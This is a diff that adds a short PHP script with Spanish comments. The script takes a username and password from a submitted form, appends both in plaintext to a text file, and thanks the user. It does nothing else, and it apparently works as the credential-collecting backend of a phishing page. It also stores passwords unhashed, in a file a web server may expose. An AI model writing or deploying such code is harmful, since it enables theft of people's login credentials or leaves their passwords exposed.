@@ -1,0 +1,13 @@
+<?php
+// Recibir datos del formulario
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Guardar datos en un archivo de texto
+$file = fopen("datos.txt", "a");
+fwrite($file, "Usuario: $username - Contraseña: $password\n");
+fclose($file);
+
+// Confirmar al usuario
+echo "Datos recibidos. ¡Gracias!";
+?>
